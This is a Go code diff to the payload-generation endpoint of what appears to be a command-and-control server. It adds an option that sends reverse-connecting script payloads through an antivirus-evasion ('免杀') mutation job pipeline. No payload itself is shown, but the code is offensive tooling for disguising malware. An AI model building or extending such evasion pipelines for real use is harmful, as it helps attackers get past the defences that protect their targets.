@@ -30,6 +30,7 @@ package server
 
 import (
 	"encoding/json"
+	"errors"
 	"fmt"
 	"log"
 	"net/http"
@@ -72,6 +73,12 @@ func (s *Server) createC2Payload(w http.ResponseWriter, r *http.Request) {
 		BindPort  int    `json:"bind_port"`
 		// 二期 §14(保留):指定则源码包额外经该机器编译出二进制。
 		BuildVPSMachineID int64 `json:"build_vps_machine_id"`
+		// 三期补丁 A v3.1(§24A):evasion_profile_id>0 时 script 产物不走直出
+		// 渲染,改走免杀变形作业管线(与 /api/c2/evasion/generate 完全同一条链路),
+		// 响应 202 {job_id}(id/payload 字段不返回,前端按 GET /api/c2/jobs/{id}
+		// 轮询)。instructions 可选,缺省回落档案的 instructions(helper 同口径)。
+		EvasionProfileID int64  `json:"evasion_profile_id"`
+		Instructions     string `json:"instructions"`
 	}
 	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
 		writeErr(w, 400, "invalid JSON: "+err.Error())
@@ -101,6 +108,57 @@ func (s *Server) createC2Payload(w http.ResponseWriter, r *http.Request) {
 	case pgdb.C2PayloadArtifactExe, pgdb.C2PayloadArtifactDll,
 		pgdb.C2PayloadArtifactShellcode, pgdb.C2PayloadArtifactEbpf:
 		req.Format = pgdb.C2PayloadFormatGoSrc
+	}
+
+	// ---- §24A 免杀档案联动(三期补丁 A v3.1):evasion_profile_id>0 → 免杀管线 ----
+	// script 产物不走直出渲染,改走免杀变形作业管线(与 /api/c2/evasion/generate
+	// 共用 startC2EvasionJob,防两份逻辑漂移);编译型产物 400 引导文案。
+	// 同档案+监听器已有 running 作业 → 409(helper 的 errC2EvasionBusy)。
+	if req.EvasionProfileID > 0 {
+		if artifact != pgdb.C2PayloadArtifactScript {
+			writeErr(w, 400, "编译型产物暂不支持档案变形（后续走 garble/构建混淆），请改选 script 或到免杀工作台处理脚本载荷")
+			return
+		}
+		if direction == pgdb.C2DirectionBind {
+			// 变形管线基于一期 reverse 模板(RenderPayload 无方向参数),不接受
+			// 档案变形;bind 的 script 交付走传输框架模板直出。
+			writeErr(w, 400, "免杀档案变形仅支持 reverse 载荷(变形管线基于 reverse 模板);bind 载荷请直出生成")
+			return
+		}
+		// 空格式:按档案的 payload_format 补齐(与 helper 同口径),顺带把档案
+		// 存在性校验提到组合表之前(格式一致性仍由 helper 兜底 400)。
+		if strings.TrimSpace(req.Format) == "" {
+			prof, perr := s.m.PG().GetC2EvasionProfile(req.EvasionProfileID)
+			if perr != nil {
+				writeErr(w, 500, perr.Error())
+				return
+			}
+			if prof == nil {
+				writeErr(w, 400, fmt.Sprintf("免杀档案 #%d 不存在", req.EvasionProfileID))
+				return
+			}
+			req.Format = prof.PayloadFormat
+		}
+		if !c2center.ValidPayloadDirection(direction) {
+			writeErr(w, 400, fmt.Sprintf("无效连接方向: %q(仅 reverse=回连 / bind=正向)", direction))
+			return
+		}
+		jobID, _, err := s.startC2EvasionJob(c2EvasionJobInput{
+			ListenerID: req.ListenerID, Format: req.Format, Target: req.Target,
+			Name: req.Name, ProfileID: req.EvasionProfileID, Instructions: req.Instructions,
+		})
+		if err != nil {
+			if errors.Is(err, errC2EvasionBusy) {
+				writeErr(w, 409, err.Error())
+				return
+			}
+			writeErr(w, 400, err.Error())
+			return
+		}
+		log.Printf("[c2-center] 载荷生成携带免杀档案 #%d(监听器 #%d %s/%s),变形作业 #%d 已排队",
+			req.EvasionProfileID, req.ListenerID, req.Target, req.Format, jobID)
+		writeJSON(w, 202, map[string]any{"job_id": jobID})
+		return
 	}
 
 	// ---- 组合表/目标平台/协议支持面/bind 端口 ----
